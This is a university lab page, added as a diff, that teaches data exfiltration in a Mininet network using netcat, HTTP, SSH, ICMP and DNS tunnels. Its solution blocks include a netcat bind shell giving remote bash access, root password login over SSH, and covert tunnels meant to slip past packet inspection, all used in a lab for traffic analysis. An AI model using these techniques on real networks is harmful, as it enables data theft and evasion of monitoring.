@@ -1,0 +1,302 @@
+====== Lab08. Data exfiltration  ======
+
+<note warning>
+Important read to be graded!
+{{page>:cdci:rec&nofooter&noeditbutton&noheader}}
+</note>
+
+===== Objectives =====
+
+  * Basic usage of the netcat tool
+  * Basic usage of the ssh tool
+  * Data exfiltration through DNS, HTTP, ICMP and UDP
+
+===== Topology =====
+
+{{ :cdci:labs:cdci_lab06-exfiltration-topology.png?direct&600 |}}
+===== Tasks =====
+
+==== 01. [5p] Virtual machine setup ====
+
+First, make sure that your virtual machine is updated (run the provided update.sh script, or create one).
+<code>
+root@cdci:/# cat update.sh
+#!/bin/bash
+# (c) Mihai Chiroiu - CDCI
+
+git clone -b labs --single-branch https://github.com/mihai-chiroiu/cdci.git
+git config user.email "student@upb.ro"
+</code>
+
+Now we need to build some docker containers
+<code>
+root@cdci:/# cd cdci/containers/exfiltration_lab06/
+root@cdci:/# make
+</code>
+
+Next, in one terminal start the provided Mininet topology.
+<code>
+root@cdci:/# cd cdci/lab06
+root@cdci:/# /usr/bin/python3 topology.py
+</code>
+
+If there are any problems with starting the topology (if all is good you should see the Mininet prompt ">") use the given cleanup script and try to restart the topology.
+
+==== 02. [5p] Internet connectivity ====
+
+Before you begin, make sure that you have Internet connectivity on all two nodes. R1 should be the gateway. Write down the IP addresses of all the nodes. Use the provided scripts to access the nodes.
+<code>
+root@ip-172-30-0-165:/# ./h1.sh 
+root@h1:/# 
+
+root@ip-172-30-0-165:/# ./h2.sh 
+root@h2:/# 
+
+root@ip-172-30-0-165:/# ./ids.sh 
+root@IDS:/# 
+</code>
+
+==== 03. [15p] Plain text exfiltration ====
+
+Netcat, also known as the 'TCP/IP Swiss Army Knife,' can be used to send data between two hosts. Create a client/server connection over port 8080. By default, the data send from the client will be printed on the server. 
+
+The switch in the topology is configured to mirror all traffic to IDS. Use this feature to save the traffic in a PCAP file using 'tcpdump'. Use Netcat to grant the client shell access on the server (hint: '-c' param on the server side).
+
+<note tip>
+For tcpdump use the '-Z root' params in order to override the privileges and allow saving data as root. 
+</note>
+
+Download the previously saved PCAP file to your local computer and analyse it using Wireshark. Use the "Follow TCP stream" option from Wireshark to observe the traffic flow between the two hosts. 
+
+<note tip>
+To copy data from inside the IDS note to the virtual machine use the provided script. 
+<code>
+./copy_from_node.sh IDS /root/traffic.pcap /home/ubuntu/
+</code>
+</note>
+
+<solution>
+<code>
+root@h2:/# nc -l -p 8080
+test
+root@h1:/# nc 192.168.16.3 8080
+test
+
+root@h2:/# nc -l -p 8080 -c /bin/bash
+[...]
+root@h1:/# nc 192.168.16.3 8080
+ls
+bin
+boot
+dev
+[...]
+</code>
+</solution>
+
+==== 04. [10p] HTTP exfiltration ====
+
+While Netcat is a good tool, the traffic that it sends can be easily removed by any Deep Packet Inspection solutions because it is a simple DATA over TCP connection. Now, use the httptunnel (hts & htc) suite to create a HTTP tunnel between the two nodes. Use this tunnel to establish a client/server connection and exfiltrate data (similar to the previous exercise).
+
+To view the traffic you can use tcpdump on the IDS (to view it locally or to transfer it to your computer and open it with Wireshark). 
+
+<solution>
+<code>
+root@h2:/# hts -F 127.0.0.1:8080 80
+root@h2:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      90/hts              
+root@h2:/# nc -l -p 8080 -k
+TEST
+
+root@h1:/# htc -F8080 192.168.16.3:80
+root@h1:/# nc 127.0.0.1 8080
+TEST
+
+</code>
+</solution>
+==== 05. [15p] SSH exfiltration ====
+
+As seen, the previous solutions send data in clear text. Create an ssh tunnel and use it to exfiltrate data via a similar client/server Netcat architecture. For this, you have to use one node as an SSH server and the second one as a client. Use the following configuration on the SSH Server
+
+<code>
+root@h2:/# vim /etc/ssh/sshd_config 
+PasswordAuthentication yes
+PermitRootLogin yes 
+
+root@h2:/# service ssh restart
+root@h2:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      198/sshd   
+</code>
+
+<note>
+In general this might not be a good idea ([[http://sites.inka.de/bigred/devel/tcp-tcp.html|http://sites.inka.de/bigred/devel/tcp-tcp.html]]).
+</note>
+
+To view the traffic you can use tcpdump on the IDS (to view it locally or to transfer it to your computer and open it with Wireshark). 
+
+<solution>
+<code>
+root@h2:/# nc -l -p 8080 -k
+TEST
+
+root@h1:/# ssh -N -L 8080:127.0.0.1:8080 root@192.168.16.3 -f
+root@192.168.16.3's password: 
+bind: Cannot assign requested address
+root@h1:/# nc 127.0.0.1 8080
+TEST
+</code>
+</solution>
+
+==== 06. [20p] ICMP exfiltration ====
+
+Another protocol that can be used to exfiltrate data is ICMP. You can use the [[https://linux.die.net/man/8/ptunnel|ptunnel]] application and tunnel the Netcat client/server connection over ICMP. 
+
+To view the traffic you can use tcpdump on the IDS (to view it locally or to transfer it to your computer and open it with Wireshark). For this exercise we strongly encourage you to view the data in Wireshark.
+
+<solution>
+<code>
+root@h2:/# ptunnel &
+[1] 331
+root@h2:/# [inf]: Starting ptunnel v 0.72.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Forwarding incoming ping packets over TCP.
+[inf]: Ping proxy is listening in privileged mode.
+root@h2:/# 
+root@h2:/#  
+root@h2:/# nc -l -p 8080 -k
+[inf]: Incoming tunnel request from 192.168.16.2.
+[inf]: Starting new session to 127.0.0.1:8080 with ID 18665
+TEST
+[inf]: Received session close from remote peer.
+[inf]: 
+Session statistics:
+[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:       13/       1/       0 Loss:  0.0%
+[inf]: 
+root@h2:/# 
+
+ 
+root@h1:/# ptunnel -p 192.168.16.3 -lp 8080 -da 127.0.0.1 -dp 8080 &
+[2] 161
+root@h1:/# [inf]: Starting ptunnel v 0.72.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Relaying packets from incoming TCP streams.
+root@h1:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      161/ptunnel         
+root@h1:/# nc 127.0.0.1 8080
+[inf]: Incoming connection.
+[evt]: No running proxy thread - starting it.
+[inf]: Ping proxy is listening in privileged mode.
+TEST
+^C
+root@h1:/# [inf]: Connection closed or lost.
+[inf]: Session statistics:
+[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:       25/       4/       0 Loss:  0.0%
+</code>
+</solution>
+
+==== 07. [20p] DNS exfiltration ====
+
+For this exercise we are going to create a DNS tunnel between the two nodes and use it for the Netcat connection. The tool for this is [[http://www.linuxcertif.com/man/1/dns2tcpc/|dns2tcp]]. Use the following configuration for the client/server side.
+  * Client side configuration
+<code>
+# cat .dns2tcprc
+domain = dns2tcp.cdci.ro
+resource = nc
+local_port = 8080
+key = secretkey
+</code>
+  * Server side configuration
+<code>
+# cat .dns2tcpdrc
+listen = 0.0.0.0
+port = 53
+user=nobody
+chroot = /root/
+pid_file = /var/run/dns2tcp.pid
+domain = dns2tcp.cdci.ro
+key = secretkey
+resources = nc:127.0.0.1:8080
+</code>
+
+To view the traffic you can use tcpdump on the IDS (to view it locally or to transfer it to your computer and open it with Wireshark). For this exercise we strongly encourage you to view the data in Wireshark.
+
+<solution>
+<code>
+root@h2:/# dns2tcpd -f .dns2tcpdrc 
+root@h2:/# netstat -nlup
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 0.0.0.0:53              0.0.0.0:*                           428/dns2tcpd           
+root@h2:/# nc -l -p 8080 -k
+TEST
+
+root@h1:/# dns2tcpc -f .dns2tcprc 192.168.16.3 &
+[2] 196
+root@h1:/# Listening on port : 8080
+root@h1:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      196/dns2tcpc   
+root@h1:/# nc 127.0.0.1 8080
+TEST
+^C
+</code>
+</solution>
+
+==== 08. [10p] Secure exfiltration ====
+
+For this exercise use an ICMP tunnel to create an ssh connection.
+
+To view the traffic you can use tcpdump on the IDS (to view it locally or to transfer it to your computer and open it with Wireshark). For this exercise we strongly encourage you to view the data in Wireshark.
+
+<solution>
+<code>
+root@h2:/# ptunnel &
+[1] 359
+root@h2:/# [inf]: Starting ptunnel v 0.72.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Forwarding incoming ping packets over TCP.
+[inf]: Ping proxy is listening in privileged mode.
+root@h2:/# service ssh start
+ * Starting OpenBSD Secure Shell server sshd                                                                           [ OK ] 
+root@h2:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      375/sshd            
+tcp6       0      0 :::22                   :::*                    LISTEN      375/sshd     
+
+
+root@h1:/# ptunnel -p 192.168.16.3 -lp 22 -da 127.0.0.1 -dp 22 &
+[2] 171
+root@h1:/# [inf]: Starting ptunnel v 0.72.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Relaying packets from incoming TCP streams.
+
+root@h1:/# netstat -nltp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      171/ptunnel         
+root@h1:/# ssh root@127.0.0.1   
+[inf]: Incoming connection.
+[evt]: No running proxy thread - starting it.
+[inf]: Ping proxy is listening in privileged mode.
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:qjFg8BPsF6kL0bYEjKrAGvLyc4C321orZpOO55jmD+8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
+root@127.0.0.1's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1057-aws x86_64)
+[...]
+Last login: Mon Mar 16 23:11:06 2020 from 192.168.16.2
+root@h2:~# 
+</code>
+</solution>
